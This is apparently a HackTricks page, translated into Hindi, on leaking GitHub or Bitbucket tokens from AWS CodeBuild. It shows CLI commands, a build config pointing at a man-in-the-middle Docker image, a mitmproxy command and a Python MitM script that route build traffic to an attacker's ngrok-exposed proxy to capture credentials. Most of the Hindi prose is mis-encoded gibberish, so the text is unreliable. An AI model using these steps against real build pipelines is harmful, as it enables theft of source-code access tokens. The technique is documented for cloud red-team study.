# AWS Codebuild - Token Leakage

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ЁЯТм [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ЁЯРж [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## Github/Bitbucket рдХреЙрдиреНрдлрд╝рд┐рдЧрд░ рдХрд┐рдП рдЧрдП рдЯреЛрдХрди рдкреБрдирд░реНрдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ

рдкрд╣рд▓реЗ, рдЬрд╛рдВрдЪреЗрдВ рдХрд┐ рдХреНрдпрд╛ рдХреЛрдИ рд╕реНрд░реЛрдд рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓реНрд╕ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░ рдХрд┐рдП рдЧрдП рд╣реИрдВ рдЬрд┐рдиреНрд╣реЗрдВ рдЖрдк рд▓реАрдХ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:
```bash
aws codebuild list-source-credentials
```
### Via Docker Image

рдпрджрд┐ рдЖрдк рдкрд╛рддреЗ рд╣реИрдВ рдХрд┐ рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП Github рдХреЗ рд▓рд┐рдП рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдЦрд╛рддреЗ рдореЗрдВ рд╕реЗрдЯ рд╣реИ, рддреЛ рдЖрдк **exfiltrate** рдЙрд╕ **access** (**GH token рдпрд╛ OAuth token**) рдХреЛ рдкреНрд░рд╛рдкреНрдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдЬрд┐рд╕рд╕реЗ Codebuild рдХреЛ **рдПрдХ рд╡рд┐рд╢рд┐рд╖реНрдЯ docker image** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдмрдирд╛рдпрд╛ рдЬрд╛ рд╕рдХреЗ рддрд╛рдХрд┐ рдкреНрд░реЛрдЬреЗрдХреНрдЯ рдХрд╛ рдирд┐рд░реНрдорд╛рдг рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХреЗред

рдЗрд╕рдХреЗ рд▓рд┐рдП рдЖрдк **рдПрдХ рдирдпрд╛ Codebuild рдкреНрд░реЛрдЬреЗрдХреНрдЯ** рдмрдирд╛ рд╕рдХрддреЗ рд╣реИрдВ рдпрд╛ **Docker image** рд╕реЗрдЯ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдореМрдЬреВрджрд╛ рдПрдХ рдХрд╛ **environment** рдмрджрд▓ рд╕рдХрддреЗ рд╣реИрдВред

рдЖрдк рдЬреЛ Docker image рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рд╡рд╣ рд╣реИ [https://github.com/carlospolop/docker-mitm](https://github.com/carlospolop/docker-mitm)ред рдпрд╣ рдПрдХ рдмрд╣реБрдд рд╣реА рдмреБрдирд┐рдпрд╛рджреА Docker image рд╣реИ рдЬреЛ **env variables `https_proxy`**, **`http_proxy`** рдФрд░ **`SSL_CERT_FILE`** рд╕реЗрдЯ рдХрд░реЗрдЧрд╛ред рдпрд╣ рдЖрдкрдХреЛ **`https_proxy`** рдФрд░ **`http_proxy`** рдореЗрдВ рдирд┐рд░реНрджрд┐рд╖реНрдЯ рд╣реЛрд╕реНрдЯ рдХреЗ рдЕрдзрд┐рдХрд╛рдВрд╢ рдЯреНрд░реИрдлрд╝рд┐рдХ рдХреЛ рдЗрдВрдЯрд░рд╕реЗрдкреНрдЯ рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрдЧрд╛ рдФрд░ **`SSL_CERT_FILE`** рдореЗрдВ рдирд┐рд░реНрджрд┐рд╖реНрдЯ SSL CERT рдкрд░ рднрд░реЛрд╕рд╛ рдХрд░реЗрдЧрд╛ред

1. **Create & Upload your own Docker MitM image**
* рдЕрдкрдиреЗ рдкреНрд░реЙрдХреНрд╕реА IP рдкрддреЗ рдХреЛ рд╕реЗрдЯ рдХрд░рдиреЗ рдФрд░ рдЕрдкрдиреЗ SSL cert рдХреЛ рд╕реЗрдЯ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП repo рдХреЗ рдирд┐рд░реНрджреЗрд╢реЛрдВ рдХрд╛ рдкрд╛рд▓рди рдХрд░реЗрдВ рдФрд░ **docker image рдмрдирд╛рдПрдВ**ред
* **`http_proxy`** рд╕реЗрдЯ рди рдХрд░реЗрдВ рддрд╛рдХрд┐ рдореЗрдЯрд╛рдбреЗрдЯрд╛ рдПрдВрдбрдкреЙрдЗрдВрдЯ рдХреЗ рд▓рд┐рдП рдЕрдиреБрд░реЛрдзреЛрдВ рдХреЛ рдЗрдВрдЯрд░рд╕реЗрдкреНрдЯ рди рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХреЗред
* рдЖрдк **`ngrok`** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдЬреИрд╕реЗ `ngrok tcp 4444` рдЕрдкрдиреЗ рд╣реЛрд╕реНрдЯ рдХреЗ рд▓рд┐рдП рдкреНрд░реЙрдХреНрд╕реА рд╕реЗрдЯ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдПред
* рдПрдХ рдмрд╛рд░ рдЬрдм рдЖрдкрдХреЗ рдкрд╛рд╕ Docker image рдмрди рдЬрд╛рдП, рддреЛ **рдЗрд╕реЗ рдПрдХ рд╕рд╛рд░реНрд╡рдЬрдирд┐рдХ repo** (Dockerhub, ECR...) рдкрд░ **рдЕрдкрд▓реЛрдб рдХрд░реЗрдВ**ред
2. **Set the environment**
* **рдПрдХ рдирдпрд╛ Codebuild рдкреНрд░реЛрдЬреЗрдХреНрдЯ** рдмрдирд╛рдПрдВ рдпрд╛ рдореМрдЬреВрджрд╛ рдПрдХ рдХреЗ environment рдХреЛ **рд╕рдВрд╢реЛрдзрд┐рдд** рдХрд░реЗрдВред
* рдкреНрд░реЛрдЬреЗрдХреНрдЯ рдХреЛ **рдкреВрд░реНрд╡ рдореЗрдВ рдЙрддреНрдкрдиреНрди Docker image** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╕реЗрдЯ рдХрд░реЗрдВред

<figure><img src="../../../../.gitbook/assets/image (3) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

3. **Set the MitM proxy in your host**

* рдЬреИрд╕рд╛ рдХрд┐ **Github repo** рдореЗрдВ рд╕рдВрдХреЗрддрд┐рдд рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ, рдЖрдк рдХреБрдЫ рдРрд╕рд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:
```bash
mitmproxy --listen-port 4444  --allow-hosts "github.com"
```
{% hint style="success" %}
**mitmproxy рд╕рдВрд╕реНрдХрд░рдг 9.0.1 рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЧрдпрд╛ рдерд╛**, рд░рд┐рдкреЛрд░реНрдЯ рдХрд┐рдпрд╛ рдЧрдпрд╛ рдХрд┐ рд╕рдВрд╕реНрдХрд░рдг 10 рдХреЗ рд╕рд╛рде рдпрд╣ рдХрд╛рдо рдирд╣реАрдВ рдХрд░ рд╕рдХрддрд╛ред
{% endhint %}

4. **рдмрд┐рд▓реНрдб рдЪрд▓рд╛рдПрдБ рдФрд░ рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓реНрд╕ рдХреИрдкреНрдЪрд░ рдХрд░реЗрдВ**

*   рдЖрдк **Authorization** рд╣реЗрдбрд░ рдореЗрдВ рдЯреЛрдХрди рджреЗрдЦ рд╕рдХрддреЗ рд╣реИрдВ:

<figure><img src="../../../../.gitbook/assets/image (19).png" alt=""><figcaption></figcaption></figure>

рдпрд╣ aws cli рд╕реЗ рдХреБрдЫ рдЗрд╕ рддрд░рд╣ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ

{% code overflow="wrap" %}
```bash
# Create project using a Github connection
aws codebuild create-project --cli-input-json file:///tmp/buildspec.json

## With /tmp/buildspec.json
{
"name": "my-demo-project",
"source": {
"type": "GITHUB",
"location": "https://github.com/uname/repo",
"buildspec": "buildspec.yml"
},
"artifacts": {
"type": "NO_ARTIFACTS"
},
"environment": {
"type": "LINUX_CONTAINER", // Use "ARM_CONTAINER" to run docker-mitm ARM
"image": "docker.io/carlospolop/docker-mitm:v12",
"computeType": "BUILD_GENERAL1_SMALL",
"imagePullCredentialsType": "CODEBUILD"
}
}

## Json

# Start the build
aws codebuild start-build --project-name my-project2
```
{% endcode %}

### ~~HTTP рдкреНрд░реЛрдЯреЛрдХреЙрд▓ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ~~

{% hint style="success" %}
**рдпрд╣ рдХрдордЬреЛрд░рд┐рдпреЛрдВ рдХреЛ AWS рдиреЗ 20 рдлрд░рд╡рд░реА 2023 рдХреЗ рд╕рдкреНрддрд╛рд╣ рдореЗрдВ рдХрд┐рд╕реА рд╕рдордп (рдореБрдЭреЗ рд▓рдЧрддрд╛ рд╣реИ рдХрд┐ рд╢реБрдХреНрд░рд╡рд╛рд░ рдХреЛ) рдареАрдХ рдХрд┐рдпрд╛ред рдЗрд╕рд▓рд┐рдП рдПрдХ рд╣рдорд▓рд╛рд╡рд░ рдЗрд╕рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдирд╣реАрдВ рдХрд░ рд╕рдХрддрд╛ :)**
{% endhint %}

рдПрдХ рд╣рдорд▓рд╛рд╡рд░ рдЬрд┐рд╕рдХреЗ рдкрд╛рд╕ **CodeBuild рдореЗрдВ рдЙрдЪреНрдЪ рдЕрдиреБрдорддрд┐рдпрд╛рдБ рд╣реИрдВ, рд╡рд╣ Github/Bitbucket рдЯреЛрдХрди рд▓реАрдХ рдХрд░ рд╕рдХрддрд╛ рд╣реИ** рдЬреЛ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░ рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ рдпрд╛ рдпрджрд┐ рдЕрдиреБрдорддрд┐рдпрд╛рдБ OAuth рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░ рдХреА рдЧрдИ рд╣реИрдВ, рддреЛ **рдХреЛрдб рддрдХ рдкрд╣реБрдБрдЪрдиреЗ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рдиреЗ рд╡рд╛рд▓рд╛ рдЕрд╕реНрдерд╛рдпреА OAuth рдЯреЛрдХрди**ред

* рдПрдХ рд╣рдорд▓рд╛рд╡рд░ **http\_proxy** рдФрд░ **https\_proxy** рдкрд░реНрдпрд╛рд╡рд░рдг рдЪрд░ рдХреЛ CodeBuild рдкреНрд░реЛрдЬреЗрдХреНрдЯ рдореЗрдВ рдЬреЛрдбрд╝ рд╕рдХрддрд╛ рд╣реИ рдЬреЛ рдЙрд╕рдХреА рдорд╢реАрди рдХреА рдУрд░ рдЗрд╢рд╛рд░рд╛ рдХрд░рддрд╛ рд╣реИ (рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП `http://5.tcp.eu.ngrok.io:14972`)ред

<figure><img src="../../../../.gitbook/assets/image (91).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../../.gitbook/assets/image (10) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

* рдлрд┐рд░, рдЧрд┐рдЯрд╣рдм рд░реЗрдкреЛ рдХрд╛ URL HTTP рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдмрджрд▓реЗрдВ, HTTPS рдХреЗ рдмрдЬрд╛рдп, рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП: \*\*http://\*\*github.com/carlospolop-forks/TestActions
* рдлрд┐рд░, рдкреНрд░реЙрдХреНрд╕реА рдЪрд░ (http\_proxy рдФрд░ https\_proxy) рджреНрд╡рд╛рд░рд╛ рдЗрдВрдЧрд┐рдд рдкреЛрд░реНрдЯ рдореЗрдВ [https://github.com/synchronizing/mitm](https://github.com/synchronizing/mitm) рд╕реЗ рдмреБрдирд┐рдпрд╛рджреА рдЙрджрд╛рд╣рд░рдг рдЪрд▓рд╛рдПрдБред
```python
from mitm import MITM, protocol, middleware, crypto

mitm = MITM(
host="127.0.0.1",
port=4444,
protocols=[protocol.HTTP],
middlewares=[middleware.Log], # middleware.HTTPLog used for the example below.
certificate_authority = crypto.CertificateAuthority()
)
mitm.run()
```
* рдЕрдВрдд рдореЗрдВ, **рдкреНрд░реЛрдЬреЗрдХреНрдЯ рдмрдирд╛рдПрдВ** рдкрд░ рдХреНрд▓рд┐рдХ рдХрд░реЗрдВ, **рдкреНрд░рдорд╛рдгрдкрддреНрд░** **рд╕реНрдкрд╖реНрдЯ рдкрд╛рда** (base64) рдореЗрдВ mitm рдкреЛрд░реНрдЯ рдкрд░ **рднреЗрдЬреЗ рдЬрд╛рдПрдВрдЧреЗ**:

<figure><img src="../../../../.gitbook/assets/image (1) (1) (6).png" alt=""><figcaption></figcaption></figure>

{% hint style="warning" %}
рдЕрдм рдПрдХ рд╣рдорд▓рд╛рд╡рд░ рдЕрдкрдиреЗ рдорд╢реАрди рд╕реЗ рдЯреЛрдХрди рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХреЗрдЧрд╛, рд╕рднреА рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░реЛрдВ рдХреА рд╕реВрдЪреА рдмрдирд╛ рд╕рдХреЗрдЧрд╛ рдФрд░ (рджреБрд░реБрдкрдпреЛрдЧ) рдХреЛрдбрдмрд┐рд▓реНрдб рд╕реЗрд╡рд╛ рдХрд╛ рд╕реАрдзреЗ рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХреА рддреБрд▓рдирд╛ рдореЗрдВ рдЖрд╕рд╛рди рддрд░реАрдХреЗ рд╕реЗ рдХрд░ рд╕рдХреЗрдЧрд╛ред
{% endhint %}

{% hint style="success" %}
AWS рд╣реИрдХрд┐рдВрдЧ рд╕реАрдЦреЗрдВ рдФрд░ рдЕрднреНрдпрд╛рд╕ рдХрд░реЗрдВ:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
GCP рд╣реИрдХрд┐рдВрдЧ рд╕реАрдЦреЗрдВ рдФрд░ рдЕрднреНрдпрд╛рд╕ рдХрд░реЗрдВ: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks рдХрд╛ рд╕рдорд░реНрдерди рдХрд░реЗрдВ</summary>

* [**рд╕рджрд╕реНрдпрддрд╛ рдпреЛрдЬрдирд╛рдУрдВ**](https://github.com/sponsors/carlospolop) рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдВ!
* **рд╣рдорд╛рд░реЗ** ЁЯТм [**Discord рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рд╕рдореВрд╣**](https://t.me/peass) рдореЗрдВ рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ рдпрд╛ **рд╣рдореЗрдВ** **Twitter** ЁЯРж [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)** рдкрд░ рдлреЙрд▓реЛ рдХрд░реЗрдВред**
* **рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ рдФрд░** [**HackTricks**](https://github.com/carlospolop/hacktricks) рдФрд░ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) рдЧрд┐рдЯрд╣рдм рд░рд┐рдкреЛрдЬрд┐рдЯрд░реА рдореЗрдВ PR рд╕рдмрдорд┐рдЯ рдХрд░реЗрдВред

</details>
{% endhint %}
